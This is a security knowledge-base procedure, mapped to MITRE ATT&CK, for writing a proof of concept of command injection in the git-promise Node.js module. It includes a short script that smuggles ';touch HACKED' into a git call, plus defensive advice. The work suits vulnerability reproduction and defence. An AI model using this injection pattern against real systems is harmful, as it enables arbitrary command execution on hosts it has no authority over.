---
id: proc-uuid-1
tags:
  - rce
  - poc-creation
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Linux
  - Node.js
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:23:24.768Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
---
# Create-Malicious-POC-Script-for-git-promise-RCE

## Summary

This procedure creates a JavaScript proof-of-concept (PoC) script that exploits the command injection vulnerability in the git-promise Node.js module by passing a malicious string to its git function, enabling arbitrary command execution.

## Description

The git-promise module version 0.3.1 insecurely concatenates user input into a shell command executed via child_process.exec on line 9 of index.js, without sanitization. This PoC script requires the module and calls git('init;touch HACKED'), injecting ';touch HACKED' to create a file after git init. It targets Node.js environments on Linux, assuming local write access, and serves as the entry point for demonstrating RCE in a development or server setup using the module.

## Requirements

1. Text editor (e.g., vim, nano) for writing the script
2. Node.js installed for syntax validation (optional)
3. Local directory with write permissions

## Defense

Defensive measures and detection strategies:

- Audit third-party Node.js dependencies for known vulnerabilities using tools like npm audit
- Use safer alternatives like child_process.execFile with argument arrays instead of exec
- Implement input validation in custom modules wrapping git operations

## Objectives

1. Generate a functional PoC script to trigger command injection
2. Prepare for vulnerability reproduction in a controlled environment
3. Demonstrate potential for arbitrary OS command execution

## Instructions

### Step 1: Write the PoC Script

**Context**: Create the JavaScript file that loads git-promise and injects the malicious command.

**Command** (Manual file creation):
No direct command; use a text editor to write `poc.js` with the following content:

```javascript
const git = require('git-promise');
git('init;touch HACKED').then(function(branch){ console.log(branch); });
```

> This script requires git-promise (to be installed later) and executes the git call, concatenating the input into 'git init;touch HACKED', leading to shell execution of touch HACKED after init.

### Step 2: Validate Script Syntax

**Context**: Ensure the script is syntactically correct before proceeding.

**Command** ([[node-check-syntax]]):
```bash
node -c poc.js
```

> Checks for syntax errors; expected output is no error messages if valid.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Unix Shell]]

### Sub-Techniques


## Commands Used

- [[node-check-syntax]]

## Tools Used


## Tags

- rce
- poc-creation
